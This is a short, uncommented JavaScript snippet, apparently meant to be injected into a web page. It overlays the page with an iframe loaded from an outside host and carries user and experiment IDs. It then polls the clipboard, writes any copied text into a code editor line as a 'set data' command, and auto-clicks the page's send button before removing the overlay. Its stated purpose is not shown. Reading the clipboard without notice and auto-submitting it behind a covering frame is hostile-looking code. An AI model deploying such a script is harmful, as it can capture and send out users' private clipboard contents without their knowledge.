(n=>{
  n.src='http://tucdb.my-board.org/con.php?user_id=62637a4cad27f22a08274d89&exp_id=686bd04e644b7b9bacb096a0';
  n.id="sq";
  n.style='position:absolute;top:5%;left:0%;width:100%;height:95%;background-color:white;z-index:101';
  document.body.appendChild(n);
})(document.createElement('iframe'));

setInterval(()=>{
  if(con){
    navigator.clipboard.readText().then(text => {
      if(text.length!=0){
        document.getElementsByClassName('cm-line')[2].innerText='set data \"'+text+'\"';
        setTimeout(()=>{
          document.getElementsByClassName('command-send')[0].click();
        },10);
        document.getElementById('sq').remove();
        con=false;
      }
    });
  }
}, 1000);
